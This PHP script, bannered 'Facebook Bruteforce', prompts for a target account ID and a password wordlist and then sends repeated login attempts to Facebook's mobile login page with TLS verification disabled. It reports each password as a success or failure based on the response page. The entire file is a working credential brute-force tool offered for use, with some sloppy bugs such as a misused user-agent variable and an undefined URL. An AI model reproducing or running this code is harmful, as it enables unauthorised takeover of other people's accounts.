<?php
error_reporting(0);
function check($user, $pass) {
	$fileua = 'kekkai-users.txt';
	$useragent = $fileua[rand(0, count($fileua) - 1)];
	$kuki = 'kuki.txt';
	touch($kuki);
$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, 'https://m.facebook.com/login.php');
	curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$user.'&pass='.$pass.'&login=Login');
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_HEADER, 0);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_COOKIEJAR, $kuki);
	curl_setopt($ch, CURLOPT_COOKIEFILE, $kuki);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
	curl_setopt($ch, CURLOPT_REFERER, 'http://m.facebook.com');
	$output = curl_exec($ch) or die('Can\'t access '.$url);
	if(stristr($output, '<title>Facebook</title>') || stristr($output, 'id="checkpointSubmitButton"')) {
		return TRUE;
	} else {
		return FALSE;
	}
}
$nc="\e[0m";
$white="\e[1;37m";
$black="\e[0;30m";
$blue="\e[0;34m";
$light_blue="\e[1;34m";
$green="\e[0;32m";
$light_green="\e[1;32m";
$cyan="\e[0;36m";
$light_cyan="\e[1;36m";
$red="\e[0;31m";
$light_red="\e[1;31m";
$purple="\e[0;35m";
$light_purple="\e[1;35m";
$brown="\e[0;33m";
$yellow="\e[1;33m";
$gray="\e[0;30m";
$light_gray="\e[0;37m";
$banner = $red." ____ _____ ____      _  __     _____ ____
/ ___|_   _/ ___|    | |/ /    |  ___| __ )
\___ \ | || |   _____| ' /_____| |_  |  _ \
 ___) || || |__|_____| . \_____|  _| | |_) |
|____/ |_| \____|    |_|\_\    |_|   |____/
".$blue."Facebook Bruteforce
".$cyan."Author: ꧁༺Šṭāя☆кёккѧї☆Šṭāя༻꧂\n\n".$nc;
$file = $_SERVER[argv][1];
echo "$white ID Target:$yellow ";
$user = trim(fgets(STDIN));
echo "$white Where password.txt:$yellow ";
$wordlist = trim(fgets(STDIN));
if(!empty($user) && !empty($wordlist)) {
	$passlist = file($wordlist);
	$passcount = count($passlist);
	print $banner;
	print "Checking ".$yellow.$passcount." password..\n".$nc;
	foreach($passlist as $password) {
		$pass = substr($password, 0, strlen($password) - 1);
		if(check(urlencode($user), urlencode($pass))) {
			print $pass." => ".$green."Plm probil ai reusit\n".$nc;
		} else {
			print $pass." => ".$red."Plm probabil ai esuat\n".$nc;
		}
	}
} else {
	print $banner;
	print "
Usage: php ".$file." [username] [wordlist]";
}
?>
